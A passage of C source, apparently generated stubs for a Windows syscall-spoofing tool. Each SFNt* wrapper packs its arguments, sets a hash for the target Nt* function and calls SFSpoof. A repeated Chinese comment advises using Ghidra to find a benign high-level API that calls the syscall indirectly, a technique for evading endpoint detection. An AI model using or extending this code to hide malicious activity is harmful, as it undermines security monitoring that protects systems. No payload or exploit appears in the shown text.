    Params.param[1] = (DWORD_PTR)StateName;
    Params.param[2] = (DWORD_PTR)NameLifetime;
    Params.param[3] = (DWORD_PTR)DataScope;
    Params.param[4] = (DWORD_PTR)PersistData;
    Params.param[5] = (DWORD_PTR)TypeId;
    Params.param[6] = (DWORD_PTR)MaximumStateSize;
    Params.param[7] = (DWORD_PTR)SecurityDescriptor;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 7;
    Params.FuncHash = 0x054CA7D4F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateWorkerFactory(PHANDLE WorkerFactoryHandleReturn, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE CompletionPortHandle, HANDLE WorkerProcessHandle, PVOID StartRoutine, PVOID StartParameter, ULONG MaxThreadCount, SIZE_T StackReserve, SIZE_T StackCommit) {
    Params.param[1] = (DWORD_PTR)WorkerFactoryHandleReturn;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)CompletionPortHandle;
    Params.param[5] = (DWORD_PTR)WorkerProcessHandle;
    Params.param[6] = (DWORD_PTR)StartRoutine;
    Params.param[7] = (DWORD_PTR)StartParameter;
    Params.param[8] = (DWORD_PTR)MaxThreadCount;
    Params.param[9] = (DWORD_PTR)StackReserve;
    Params.param[10] = (DWORD_PTR)StackCommit;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 10;
    Params.FuncHash = 0x0CAAEFA17;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDebugActiveProcess(HANDLE ProcessHandle, HANDLE DebugObjectHandle) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)DebugObjectHandle;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x086399F55;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDebugContinue(HANDLE DebugObjectHandle, PCLIENT_ID ClientId, NTSTATUS ContinueStatus) {
    Params.param[1] = (DWORD_PTR)DebugObjectHandle;
    Params.param[2] = (DWORD_PTR)ClientId;
    Params.param[3] = (DWORD_PTR)ContinueStatus;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x048DCDBD0;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDeleteAtom(USHORT Atom) {
    Params.param[1] = (DWORD_PTR)Atom;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0DF4E3C17;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDeleteBootEntry(ULONG Id) {
    Params.param[1] = (DWORD_PTR)Id;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0898AE966;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDeleteDriverEntry(ULONG Id) {
    Params.param[1] = (DWORD_PTR)Id;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x001987B7A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDeleteFile(POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)ObjectAttributes;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0BBB92F81;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDeleteKey(HANDLE KeyHandle) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0C793EA39;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDeleteObjectAuditAlarm(PUNICODE_STRING SubsystemName, PVOID HandleId, BOOLEAN GenerateOnClose) {
    Params.param[1] = (DWORD_PTR)SubsystemName;
    Params.param[2] = (DWORD_PTR)HandleId;
    Params.param[3] = (DWORD_PTR)GenerateOnClose;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x034BA15EE;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDeletePrivateNamespace(HANDLE NamespaceHandle) {
    Params.param[1] = (DWORD_PTR)NamespaceHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x035112A95;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDeleteValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)ValueName;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x02F3B00ED;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDeleteWnfStateData(PCWNF_STATE_NAME StateName, PVOID ExplicitScope) {
    Params.param[1] = (DWORD_PTR)StateName;
    Params.param[2] = (DWORD_PTR)ExplicitScope;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x064FB9AA6;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDeleteWnfStateName(PCWNF_STATE_NAME StateName) {
    Params.param[1] = (DWORD_PTR)StateName;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x076118349;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDisableLastKnownGood() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x039A84F22;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDisplayString(PUNICODE_STRING String) {
    Params.param[1] = (DWORD_PTR)String;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x00B063185;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDrawText(PUNICODE_STRING String) {
    Params.param[1] = (DWORD_PTR)String;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x078DF6F5C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtEnableLastKnownGood() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x0F8D2D658;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtEnumerateBootEntries(PVOID Buffer, PULONG BufferLength) {
    Params.param[1] = (DWORD_PTR)Buffer;
    Params.param[2] = (DWORD_PTR)BufferLength;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0CF93E00B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtEnumerateDriverEntries(PVOID Buffer, PULONG BufferLength) {
    Params.param[1] = (DWORD_PTR)Buffer;
    Params.param[2] = (DWORD_PTR)BufferLength;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x00A49FF31;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtEnumerateSystemEnvironmentValuesEx(ULONG InformationClass, PVOID Buffer, PULONG BufferLength) {
    Params.param[1] = (DWORD_PTR)InformationClass;
    Params.param[2] = (DWORD_PTR)Buffer;
    Params.param[3] = (DWORD_PTR)BufferLength;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x051AD1F7A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtEnumerateTransactionObject(HANDLE RootObjectHandle, KTMOBJECT_TYPE QueryType, PKTMOBJECT_CURSOR ObjectCursor, ULONG ObjectCursorLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)RootObjectHandle;
    Params.param[2] = (DWORD_PTR)QueryType;
    Params.param[3] = (DWORD_PTR)ObjectCursor;
    Params.param[4] = (DWORD_PTR)ObjectCursorLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x09844F689;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtExtendSection(HANDLE SectionHandle, PLARGE_INTEGER NewSectionSize) {
    Params.param[1] = (DWORD_PTR)SectionHandle;
    Params.param[2] = (DWORD_PTR)NewSectionSize;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x075622BAF;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFilterBootOption(FILTER_BOOT_OPTION_OPERATION FilterOperation, ULONG ObjectType, ULONG ElementType, PVOID SystemData, ULONG DataSize) {
    Params.param[1] = (DWORD_PTR)FilterOperation;
    Params.param[2] = (DWORD_PTR)ObjectType;
    Params.param[3] = (DWORD_PTR)ElementType;
    Params.param[4] = (DWORD_PTR)SystemData;
    Params.param[5] = (DWORD_PTR)DataSize;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x042CEA35D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFilterToken(HANDLE ExistingTokenHandle, ULONG Flags, PTOKEN_GROUPS SidsToDisable, PTOKEN_PRIVILEGES PrivilegesToDelete, PTOKEN_GROUPS RestrictedSids, PHANDLE NewTokenHandle) {
    Params.param[1] = (DWORD_PTR)ExistingTokenHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)SidsToDisable;
    Params.param[4] = (DWORD_PTR)PrivilegesToDelete;
    Params.param[5] = (DWORD_PTR)RestrictedSids;
    Params.param[6] = (DWORD_PTR)NewTokenHandle;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x04591C9B2;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFilterTokenEx(HANDLE TokenHandle, ULONG Flags, PTOKEN_GROUPS SidsToDisable, PTOKEN_PRIVILEGES PrivilegesToDelete, PTOKEN_GROUPS RestrictedSids, ULONG DisableUserClaimsCount, PUNICODE_STRING UserClaimsToDisable, ULONG DisableDeviceClaimsCount, PUNICODE_STRING DeviceClaimsToDisable, PTOKEN_GROUPS DeviceGroupsToDisable, PTOKEN_SECURITY_ATTRIBUTES_INFORMATION RestrictedUserAttributes, PTOKEN_SECURITY_ATTRIBUTES_INFORMATION RestrictedDeviceAttributes, PTOKEN_GROUPS RestrictedDeviceGroups, PHANDLE NewTokenHandle) {
    Params.param[1] = (DWORD_PTR)TokenHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)SidsToDisable;
    Params.param[4] = (DWORD_PTR)PrivilegesToDelete;
    Params.param[5] = (DWORD_PTR)RestrictedSids;
    Params.param[6] = (DWORD_PTR)DisableUserClaimsCount;
    Params.param[7] = (DWORD_PTR)UserClaimsToDisable;
    Params.param[8] = (DWORD_PTR)DisableDeviceClaimsCount;
    Params.param[9] = (DWORD_PTR)DeviceClaimsToDisable;
    Params.param[10] = (DWORD_PTR)DeviceGroupsToDisable;
    Params.param[11] = (DWORD_PTR)RestrictedUserAttributes;
    Params.param[12] = (DWORD_PTR)RestrictedDeviceAttributes;
    Params.param[13] = (DWORD_PTR)RestrictedDeviceGroups;
    Params.param[14] = (DWORD_PTR)NewTokenHandle;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 14;
    Params.FuncHash = 0x01620D09E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFlushBuffersFileEx(HANDLE FileHandle, ULONG Flags, PVOID Parameters, ULONG ParametersSize, PIO_STATUS_BLOCK IoStatusBlock) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)Parameters;
    Params.param[4] = (DWORD_PTR)ParametersSize;
    Params.param[5] = (DWORD_PTR)IoStatusBlock;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x08C970FAF;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFlushInstallUILanguage(LANGID InstallUILanguage, ULONG SetComittedFlag) {
    Params.param[1] = (DWORD_PTR)InstallUILanguage;
    Params.param[2] = (DWORD_PTR)SetComittedFlag;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0685F7DE6;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFlushInstructionCache(HANDLE ProcessHandle, PVOID BaseAddress, ULONG Length) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)BaseAddress;
    Params.param[3] = (DWORD_PTR)Length;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x08D2FF9B7;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFlushKey(HANDLE KeyHandle) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x024904975;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFlushProcessWriteBuffers() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x0E0589C90;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFlushVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PULONG RegionSize, PIO_STATUS_BLOCK IoStatusBlock) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)BaseAddress;
    Params.param[3] = (DWORD_PTR)RegionSize;
    Params.param[4] = (DWORD_PTR)IoStatusBlock;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x03191371F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFlushWriteBuffer() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x0E75DD5E1;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFreeUserPhysicalPages(HANDLE ProcessHandle, PULONG NumberOfPages, PULONG UserPfnArray) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)NumberOfPages;
    Params.param[3] = (DWORD_PTR)UserPfnArray;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x006BFFEB4;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFreezeRegistry(ULONG TimeOutInSeconds) {
    Params.param[1] = (DWORD_PTR)TimeOutInSeconds;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0CE54F6E5;
    SFSpoof(Params.FuncHash);
